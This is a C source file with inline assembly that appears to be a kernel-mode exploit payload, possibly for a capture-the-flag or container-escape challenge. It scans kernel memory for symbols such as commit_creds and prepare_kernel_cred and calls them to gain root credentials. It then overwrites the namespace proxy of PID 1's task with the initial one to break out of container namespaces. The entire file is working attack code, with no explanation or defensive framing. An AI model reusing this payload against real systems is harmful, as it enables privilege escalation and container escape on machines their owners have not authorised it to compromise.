typedef unsigned long size_t;

asm(".intel_syntax noprefix; .globl	_start; _start: lea rdi, [rip + 0x1000]; jmp main_start");

// copy from musl-libc
static int my_memcmp(const void *vl, const void *vr, size_t n) {
    const unsigned char *l = vl, *r = vr;
    for (; n && *l == *r; n--, l++, r++)
        ;
    return n ? *l - *r : 0;
}

// copy from https://blog.csdn.net/lqy971966/article/details/106127286
static const char *my_memmem(const char *haystack, size_t hlen, const char *needle, size_t nlen) {
    const char *cur;
    const char *last;

    last = haystack + hlen - nlen;
    for (cur = haystack; cur <= last; ++cur) {
        if (!my_memcmp(cur, needle, nlen)) {
            return cur;
        }
    }
    return 0;
}

static void *find_symtab(char *start_pos, size_t find_max, const char *func_name, size_t func_length) {
    while (1) {
        const char *strtab = my_memmem(start_pos, find_max, func_name, func_length);
        if (!strtab) {
            return 0;
        }

        for (char *pos = (char *)(((size_t)start_pos) & ~3); pos < (char *)(((size_t)start_pos) + find_max); pos += 4) {
            if ((pos + *(unsigned int *)pos) == strtab) {
                return pos - 4;
            }
        }

        find_max -= (strtab + func_length) - start_pos;
        start_pos = (strtab + func_length);
    }

    return 0;
}

static char *get_ptr(char *symtab) {
    if (symtab) {
        return (void *)(symtab + *(int *)(symtab));
    }
    return 0;
}

#define pid_namespace_approx_size (0xa0)
#define task_struct_approx_size (0x3000)
static char *find_init_task(char *init_pid_ns) {
    for (size_t *pos = init_pid_ns; pos < init_pid_ns + pid_namespace_approx_size; pos++) {
        size_t may_ptr = *pos;
        if ((may_ptr & 0xffff000000000000) != 0xffff000000000000) {
            continue;
        }

        char *may_task = (char *)may_ptr;
        // check task
        for (size_t *pos2 = may_task; pos2 < may_task + task_struct_approx_size; pos2++) {
            if (*pos2 == may_task) {
                return may_task;
            }
        }
    }
    return 0;
}

#define nsproxy_approx_size (0x60)
static char *find_init_nsproxy(char *init_pid_ns, char *init_uts_ns, size_t *nsproxy_offset) {
    char *init_task = find_init_task(init_pid_ns);
    if (!init_task) {
        return 0;
    }

    // find init_nsproxy in init_task
    for (size_t *pos = init_task; pos < init_task + task_struct_approx_size; pos++) {
        size_t may_ptr = *pos;
        if ((may_ptr & 0xffff000000000000) != 0xffff000000000000) {
            continue;
        }
        if (may_ptr == init_task) {
            continue;
        }

        // guess init_nsproxy
        char *may_nsproxy = may_ptr;
        int has_pid_ns = 0;
        int has_uts_ns = 0;
        for (size_t *pos2 = may_nsproxy; pos2 < may_nsproxy + nsproxy_approx_size; pos2++) {
            size_t may_ptr2 = *pos2;
            if (may_ptr2 == init_pid_ns) {
                has_pid_ns = 1;
            }
            if (may_ptr2 == init_uts_ns) {
                has_uts_ns = 1;
            }

            if (has_uts_ns && has_pid_ns) {
                *nsproxy_offset = may_nsproxy - init_task;
                return may_nsproxy;
            }
        }
    }

    return 0;
}

#define find_max (0x2000000)
void *main_start(void *start_pos) {

    // first, get root
    typedef void *(*typ_prepare_kernel_cred)(size_t);
    typedef int (*typ_commit_creds)(void *);

    char str_commit_creds[] = "commit_creds";
    typ_commit_creds ptr_commit_creds = (typ_commit_creds)get_ptr(find_symtab(start_pos, find_max, str_commit_creds, sizeof(str_commit_creds)));
    if (!ptr_commit_creds) {
        return 0;
    }

    char str_prepare_kernel_cred[] = "prepare_kernel_cred";
    typ_prepare_kernel_cred ptr_prepare_kernel_cred = (typ_prepare_kernel_cred)get_ptr(find_symtab(start_pos, find_max, str_prepare_kernel_cred, sizeof(str_prepare_kernel_cred)));
    if (!ptr_prepare_kernel_cred) {
        return 0;
    }

    ptr_commit_creds(ptr_prepare_kernel_cred(0));

    // then find init_nsproxy and pid1 task_struct
    typedef void *(*typ_find_vpid)(size_t);
    typedef void *(*typ_pid_task)(void *, size_t);

    char str_find_vpid[] = "find_vpid";
    typ_find_vpid fptr_find_vpid = (typ_find_vpid)get_ptr(find_symtab(start_pos, find_max, str_find_vpid, sizeof(str_find_vpid)));
    if (!fptr_find_vpid) {
        return 0;
    }

    char str_pid_task[] = "pid_task";
    typ_pid_task fptr_pid_task = (typ_pid_task)get_ptr(find_symtab(start_pos, find_max, str_pid_task, sizeof(str_pid_task)));
    if (!fptr_pid_task) {
        return 0;
    }

    char *task = fptr_pid_task(fptr_find_vpid(1), 0);

    char str_init_pid_ns[] = "init_pid_ns";
    char *ptr_init_pid_ns = get_ptr(find_symtab(start_pos, find_max, str_init_pid_ns, sizeof(str_init_pid_ns)));
    if (!ptr_init_pid_ns) {
        return 0;
    }

    char str_init_uts_ns[] = "init_uts_ns";
    char *ptr_init_uts_ns = get_ptr(find_symtab(start_pos, find_max, str_init_uts_ns, sizeof(str_init_uts_ns)));
    if (!ptr_init_uts_ns) {
        return 0;
    }

    size_t nsproxy_offset = 0;
    char *init_ns_proxy = find_init_nsproxy(ptr_init_pid_ns, ptr_init_uts_ns, &nsproxy_offset);

    if (!init_ns_proxy) {
        return 0;
    }

    // escape namespace
    *(size_t *)(task + nsproxy_offset) = (size_t)init_ns_proxy;

    return 0;
}